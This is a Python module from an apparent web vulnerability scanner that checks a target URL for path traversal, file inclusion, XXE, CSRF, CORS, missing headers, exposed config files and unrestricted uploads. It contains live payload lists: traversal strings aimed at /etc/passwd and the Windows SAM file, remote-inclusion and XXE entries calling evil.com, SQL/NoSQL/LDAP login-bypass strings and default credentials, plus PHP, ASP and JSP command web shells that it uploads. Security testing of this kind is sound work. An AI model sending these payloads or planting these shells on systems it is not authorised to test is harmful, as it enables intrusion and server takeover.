#!/usr/bin/env python3
"""
Additional Vulnerability Testing Module
Tests for various other security vulnerabilities including:
- Directory Traversal / Path Traversal
- CSRF (Cross-Site Request Forgery)
- File Upload Vulnerabilities
- Local File Inclusion (LFI)
- Remote File Inclusion (RFI)
- XXE (XML External Entity)
- Authentication Bypass
- Information Disclosure
- Security Headers
- CORS Misconfigurations
"""

import requests
import re
import time
import base64
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
import urllib.parse

class AdditionalVulnTester:
    def __init__(self, timeout=10, level='normal'):
        self.timeout = timeout
        self.level = level
        self.vulnerabilities = []
        
        # Directory traversal payloads
        self.directory_traversal_payloads = [
            # Basic traversal
            '../../../etc/passwd', '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd', '..%2f..%2f..%2fetc%2fpasswd',
            
            # Encoded traversal
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            '..%252f..%252f..%252fetc%252fpasswd',
            
            # Unicode/UTF-8 encoded
            '%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd',
            '..%c1%9c..%c1%9cetc%c1%9cpasswd',
            
            # Windows specific
            '..\\..\\..\\windows\\system32\\config\\sam',
            '..\\..\\..\\boot.ini', '..\\..\\..\\windows\\win.ini',
            
            # Null byte injection
            '../../../etc/passwd%00', '../../../etc/passwd%00.jpg',
            
            # Filter bypasses
            '....//....//....//etc/passwd', '..//////..///////etc/passwd',
            r'.././.././.././etc/passwd', r'....\\\\....\\\\etc\\passwd',
        ]
        
        # File inclusion payloads
        self.file_inclusion_payloads = [
            # Local File Inclusion
            '/etc/passwd', '/etc/shadow', '/etc/hosts', '/proc/version',
            '/proc/self/environ', '/proc/self/cmdline', '/proc/self/status',
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            'C:\\windows\\system32\\config\\sam',
            
            # Remote File Inclusion
            'http://evil.com/shell.txt', 'https://pastebin.com/raw/malicious',
            'ftp://evil.com/shell.php', 'data://text/plain;base64,' + base64.b64encode(b'<?php phpinfo(); ?>').decode(),
            
            # Wrapper attacks
            'php://filter/convert.base64-encode/resource=index.php',
            'php://input', 'expect://whoami', 'zip://shell.jpg%23shell.php',
        ]
        
        # XXE payloads
        self.xxe_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <root>&xxe;</root>''',
            
            '''<?xml version="1.0"?>
            <!DOCTYPE root [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]>
            <root>&xxe;</root>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE root [
            <!ENTITY % xxe SYSTEM "file:///etc/passwd">
            %xxe;
            ]>
            <root>test</root>''',
        ]
        
        # Authentication bypass payloads
        self.auth_bypass_payloads = [
            # SQL injection in auth
            "admin' OR '1'='1", "admin' --", "admin'/*", 
            "' OR 1=1--", "' OR 'x'='x", "') OR ('x')=('x",
            
            # NoSQL injection
            '{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}',
            
            # LDAP injection
            "*)(&(objectClass=*)(cn=*))(|(cn=*", "*)))(|(objectClass=*))",
            
            # Default credentials
            'admin:admin', 'admin:password', 'admin:123456',
            'root:root', 'test:test', 'guest:guest',
        ]
        
        # Security headers to check
        self.security_headers = {
            'X-Frame-Options': 'DENY or SAMEORIGIN',
            'X-Content-Type-Options': 'nosniff',
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age value',
            'Content-Security-Policy': 'CSP directives',
            'Referrer-Policy': 'strict-origin-when-cross-origin',
            'Permissions-Policy': 'feature permissions',
            'X-Permitted-Cross-Domain-Policies': 'none or master-only'
        }
    
    def test_directory_traversal(self, url, param='file'):
        """Test for directory traversal vulnerabilities"""
        results = []
        
        for payload in self.directory_traversal_payloads:
            try:
                # Test GET method
                response = requests.get(url, params={param: payload}, 
                                      timeout=self.timeout, verify=False)
                
                # Check for file content indicators
                traversal_indicators = [
                    'root:', 'bin:', 'daemon:', 'www-data:',  # /etc/passwd
                    '127.0.0.1', 'localhost',  # /etc/hosts
                    '[boot loader]', '[operating systems]',  # boot.ini
                    '; for 16-bit app support', '[fonts]',  # win.ini
                ]
                
                for indicator in traversal_indicators:
                    if indicator.lower() in response.text.lower():
                        vuln = {
                            'type': 'Directory Traversal / Path Traversal',
                            'severity': 'High',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'method': 'GET',
                            'evidence': f"File content indicator found: {indicator}",
                            'status_code': response.status_code
                        }
                        results.append(vuln)
                        print(f"{Fore.RED}[!] Directory Traversal found: {url} (param: {param}){Style.RESET_ALL}")
                        break
                
            except Exception:
                continue
        
        return results
    
    def test_file_inclusion(self, url, param='file'):
        """Test for Local/Remote File Inclusion vulnerabilities"""
        results = []
        
        for payload in self.file_inclusion_payloads:
            try:
                response = requests.get(url, params={param: payload}, 
                                      timeout=self.timeout, verify=False)
                
                # LFI indicators
                lfi_indicators = [
                    'root:', '/bin/bash', 'daemon:', 'www-data:',
                    'PHP Version', 'System =>', 'Configuration File',
                    'DOCUMENT_ROOT', 'SERVER_SOFTWARE'
                ]
                
                # RFI indicators
                rfi_indicators = [
                    'remote file included', 'shell uploaded', 'backdoor',
                    'eval(', 'system(', 'exec(', 'passthru('
                ]
                
                for indicator in lfi_indicators + rfi_indicators:
                    if indicator.lower() in response.text.lower():
                        vuln_type = 'Remote File Inclusion (RFI)' if indicator in rfi_indicators else 'Local File Inclusion (LFI)'
                        severity = 'Critical' if indicator in rfi_indicators else 'High'
                        
                        vuln = {
                            'type': vuln_type,
                            'severity': severity,
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'method': 'GET',
                            'evidence': f"File inclusion indicator: {indicator}",
                            'status_code': response.status_code
                        }
                        results.append(vuln)
                        print(f"{Fore.RED}[!] {vuln_type} found: {url}{Style.RESET_ALL}")
                        break
                
            except Exception:
                continue
        
        return results
    
    def test_xxe(self, url):
        """Test for XXE (XML External Entity) vulnerabilities"""
        results = []
        
        for payload in self.xxe_payloads:
            try:
                headers = {'Content-Type': 'application/xml'}
                response = requests.post(url, data=payload, headers=headers,
                                       timeout=self.timeout, verify=False)
                
                # XXE indicators
                xxe_indicators = [
                    'root:', 'bin:', 'daemon:',  # /etc/passwd content
                    'SYSTEM "file://', 'ENTITY', 'DOCTYPE',
                    'xml version', 'parsing error', 'entity not defined'
                ]
                
                for indicator in xxe_indicators:
                    if indicator.lower() in response.text.lower():
                        vuln = {
                            'type': 'XML External Entity (XXE) Injection',
                            'severity': 'High',
                            'url': url,
                            'method': 'POST',
                            'payload': payload[:100] + '...',
                            'evidence': f"XXE indicator found: {indicator}",
                            'status_code': response.status_code
                        }
                        results.append(vuln)
                        print(f"{Fore.RED}[!] XXE vulnerability found: {url}{Style.RESET_ALL}")
                        break
                
            except Exception:
                continue
        
        return results
    
    def test_csrf(self, url):
        """Test for CSRF vulnerabilities"""
        results = []
        
        try:
            # Check if forms exist and lack CSRF protection
            response = requests.get(url, timeout=self.timeout, verify=False)
            
            # Look for forms
            forms = re.findall(r'<form[^>]*>(.*?)</form>', response.text, re.DOTALL | re.IGNORECASE)
            
            for i, form in enumerate(forms):
                has_csrf_token = any(token in form.lower() for token in 
                                   ['csrf', 'token', '_token', 'authenticity_token'])
                
                if not has_csrf_token:
                    vuln = {
                        'type': 'Cross-Site Request Forgery (CSRF)',
                        'severity': 'Medium',
                        'url': url,
                        'method': 'GET',
                        'evidence': f"Form {i+1} lacks CSRF protection",
                        'status_code': response.status_code
                    }
                    results.append(vuln)
                    print(f"{Fore.YELLOW}[!] CSRF vulnerability: {url} (Form {i+1}){Style.RESET_ALL}")
        
        except Exception:
            pass
        
        return results
    
    def test_security_headers(self, url):
        """Test for missing security headers"""
        results = []
        
        try:
            response = requests.get(url, timeout=self.timeout, verify=False)
            
            for header, description in self.security_headers.items():
                if header not in response.headers:
                    vuln = {
                        'type': 'Missing Security Header',
                        'severity': 'Low',
                        'url': url,
                        'method': 'GET',
                        'missing_header': header,
                        'evidence': f"Missing security header: {header} ({description})",
                        'status_code': response.status_code
                    }
                    results.append(vuln)
                    print(f"{Fore.CYAN}[!] Missing header: {url} - {header}{Style.RESET_ALL}")
        
        except Exception:
            pass
        
        return results
    
    def test_cors_misconfiguration(self, url):
        """Test for CORS misconfigurations"""
        results = []
        
        malicious_origins = [
            'http://evil.com',
            'https://attacker.com', 
            'null',
            'http://localhost',
            url + '.evil.com'
        ]
        
        for origin in malicious_origins:
            try:
                headers = {'Origin': origin}
                response = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
                
                cors_header = response.headers.get('Access-Control-Allow-Origin', '')
                
                if cors_header == '*' or cors_header == origin:
                    severity = 'High' if cors_header == '*' else 'Medium'
                    vuln = {
                        'type': 'CORS Misconfiguration',
                        'severity': severity,
                        'url': url,
                        'method': 'GET',
                        'malicious_origin': origin,
                        'evidence': f"CORS allows origin: {cors_header}",
                        'status_code': response.status_code
                    }
                    results.append(vuln)
                    print(f"{Fore.YELLOW}[!] CORS misconfiguration: {url} - {cors_header}{Style.RESET_ALL}")
                
            except Exception:
                continue
        
        return results
    
    def test_file_upload(self, url):
        """Test for file upload vulnerabilities"""
        results = []
        
        # Malicious file payloads
        malicious_files = [
            ('shell.php', b'<?php system($_GET["cmd"]); ?>', 'text/x-php'),
            ('shell.asp', b'<%eval request("cmd")%>', 'text/x-asp'),
            ('shell.jsp', b'<%@ page import="java.io.*" %><%Runtime.getRuntime().exec(request.getParameter("cmd"));%>', 'text/x-jsp'),
            ('test.exe', b'MZ\x90\x00\x03\x00\x00\x00', 'application/octet-stream'),
            ('test.txt.php', b'<?php phpinfo(); ?>', 'text/plain'),  # Double extension
            ('test.php.jpg', b'<?php phpinfo(); ?>', 'image/jpeg'),  # Reverse double extension
        ]
        
        for filename, content, content_type in malicious_files:
            try:
                files = {'file': (filename, content, content_type)}
                response = requests.post(url, files=files, timeout=self.timeout, verify=False)
                
                # Check for successful upload indicators
                if any(indicator in response.text.lower() for indicator in 
                      ['uploaded', 'success', 'saved', 'file received']):
                    vuln = {
                        'type': 'Unrestricted File Upload',
                        'severity': 'Critical',
                        'url': url,
                        'method': 'POST',
                        'filename': filename,
                        'evidence': f"Malicious file upload accepted: {filename}",
                        'status_code': response.status_code
                    }
                    results.append(vuln)
                    print(f"{Fore.RED}[!] File upload vulnerability: {url} ({filename}){Style.RESET_ALL}")
                
            except Exception:
                continue
        
        return results
    
    def test_information_disclosure(self, url):
        """Test for information disclosure"""
        results = []
        
        info_paths = [
            '/.env', '/config.json', '/backup.sql', '/database.sql',
            '/.git/config', '/.svn/entries', '/phpinfo.php', '/info.php',
            '/robots.txt', '/sitemap.xml', '/crossdomain.xml',
            '/web.config', '/.htaccess', '/server-status', '/server-info'
        ]
        
        for path in info_paths:
            try:
                test_url = f"{url.rstrip('/')}{path}"
                response = requests.get(test_url, timeout=self.timeout, verify=False)
                
                if response.status_code == 200:
                    # Check for sensitive information
                    sensitive_patterns = [
                        r'password\s*[:=]\s*["\']?([^"\'\s]+)["\']?',
                        r'api[_-]?key\s*[:=]\s*["\']?([^"\'\s]+)["\']?',
                        r'secret\s*[:=]\s*["\']?([^"\'\s]+)["\']?',
                        r'token\s*[:=]\s*["\']?([^"\'\s]+)["\']?',
                    ]
                    
                    for pattern in sensitive_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vuln = {
                                'type': 'Information Disclosure',
                                'severity': 'Medium',
                                'url': test_url,
                                'method': 'GET',
                                'evidence': f"Sensitive information pattern found: {pattern[:50]}...",
                                'status_code': response.status_code
                            }
                            results.append(vuln)
                            print(f"{Fore.YELLOW}[!] Information disclosure: {test_url}{Style.RESET_ALL}")
                            break
                
            except Exception:
                continue
        
        return results
    
    def test_additional_vulnerabilities(self, targets):
        """Main function to test additional vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Starting additional vulnerability tests...{Style.RESET_ALL}")
        
        all_vulnerabilities = []
        
        # Handle different target formats
        if isinstance(targets, str):
            targets = [{'url': targets, 'subdomain': targets}]
        elif not isinstance(targets, list):
            targets = [targets]
        
        for target in targets:
            if isinstance(target, str):
                url = target
            else:
                url = target.get('url', target.get('subdomain', ''))
            
            if not url.startswith('http'):
                url = f"http://{url}"
            
            print(f"{Fore.CYAN}[*] Testing additional vulnerabilities: {url}{Style.RESET_ALL}")
            
            # Test directory traversal
            dt_vulns = self.test_directory_traversal(url)
            all_vulnerabilities.extend(dt_vulns)
            
            # Test file inclusion
            fi_vulns = self.test_file_inclusion(url)
            all_vulnerabilities.extend(fi_vulns)
            
            # Test security headers
            header_vulns = self.test_security_headers(url)
            all_vulnerabilities.extend(header_vulns)
            
            # Test CORS
            cors_vulns = self.test_cors_misconfiguration(url)
            all_vulnerabilities.extend(cors_vulns)
            
            # Test information disclosure
            info_vulns = self.test_information_disclosure(url)
            all_vulnerabilities.extend(info_vulns)
            
            # Additional tests for moderate/extreme levels
            if self.level in ['moderate', 'extreme']:
                # Test XXE
                xxe_vulns = self.test_xxe(url)
                all_vulnerabilities.extend(xxe_vulns)
                
                # Test CSRF
                csrf_vulns = self.test_csrf(url)
                all_vulnerabilities.extend(csrf_vulns)
                
                # Test file upload
                upload_vulns = self.test_file_upload(url)
                all_vulnerabilities.extend(upload_vulns)
        
        self.vulnerabilities = all_vulnerabilities
        return all_vulnerabilities